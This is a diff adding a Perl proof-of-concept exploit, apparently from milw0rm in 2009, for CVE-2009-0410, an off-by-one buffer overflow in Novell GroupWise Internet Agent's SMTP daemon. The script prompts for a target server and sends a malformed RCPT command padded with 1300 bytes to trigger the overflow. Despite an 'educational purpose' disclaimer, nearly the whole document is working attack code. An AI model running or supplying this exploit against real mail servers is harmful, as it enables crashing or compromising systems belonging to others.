@@ -1,0 +1,57 @@
+#!usr/bin/perl -w
+
+#######################################################################################
+###############################QUICK AND DIRTY EXPLOIT#################################
+#######################################################################################
+#   Off-by-one error in the SMTP daemon in GroupWise Internet Agent (GWIA)
+#    in Novell GroupWise 6.5x, 7.0, 7.01, 7.02, 7.03, 7.03HP1a, and 8.0 allows
+#    remote attackers to execute arbitrary code via a long e-mail address in a
+#    malformed RCPT command, leading to a buffer overflow.
+#    Refer:
+#    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0410
+#
+#    To run this exploit on MS Windows replace "#!usr/bin/perl -w" with
+#     "#!Installation_path_for_perl -w" (say #!C:/Program Files/Perl/bin/perl -w)
+#
+#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
+#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
+#
+#        Author:    Praveen Darshanam
+#        Email:     praveen[underscore]recker[at]sify.com\
+#         Blog:        http://www.darshanams.blogspot.com/
+#        Date:      04th February, 2009
+#
+########Thanx to str0ke, milw0rm, @rp m@n, an all the security folks####################
+########################################################################################
+
+
+use Net::SMTP;
+print "***SMTP module is working fine***\n";
+
+
+$buff="D" x 1300;
+print "Enter Vulnerable Novell GroupWise SMTP Server Domain Name\n";
+$smtp_vuln_server_name=<STDIN>;
+chop($smtp_vuln_server_name);
+
+$smtp_attack=Net::SMTP->new("$smtp_vuln_server_name");
+print"\nEnter your/from mail ID here\n";
+$$mail_from=<STDIN>;
+chop($mail_from);
+
+
+print"\nEnter Recepient mail ID\n";
+$to_mail_id=<STDIN>;
+chop($to_mail_id);
+
+$mal_buffer=$buff.$to_mail_id;
+
+$smtp_attack->mail($mail_from);
+$smtp_attack->to($mal_buffer);
+
+$smtp_attack->data();
+$smtp_attack->datasend("Attacking...");
+
+$smtp_attack->quit();
+
+# milw0rm.com [2009-02-04]
